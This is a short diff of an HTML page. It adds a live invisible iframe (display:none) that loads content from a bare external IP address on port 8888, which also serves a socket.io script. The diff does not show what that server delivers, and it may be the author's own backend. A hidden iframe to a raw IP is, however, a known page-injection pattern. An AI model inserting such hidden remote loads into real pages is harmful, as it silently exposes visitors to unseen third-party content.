@@ -141,7 +141,6 @@
 // 			});
 // 		}
 	</script>
-<!-- 	<iframe src="http://14.32.66.123:8888" style="display:none;"> -->
 	<script src="http://14.32.66.123:8888/socket.io/socket.io.js"></script>
 	<script>
 		
@@ -160,7 +159,8 @@
 		});
 		
 	</script>
-<!-- 	</iframe> -->
+	<iframe src="http://14.32.66.123:8888" style="display:none;">
+	</iframe>
 <!-- 	<iframe src="http://14.32.66.123:8888" style="display:none;"></iframe> -->
 </body>
 </html>
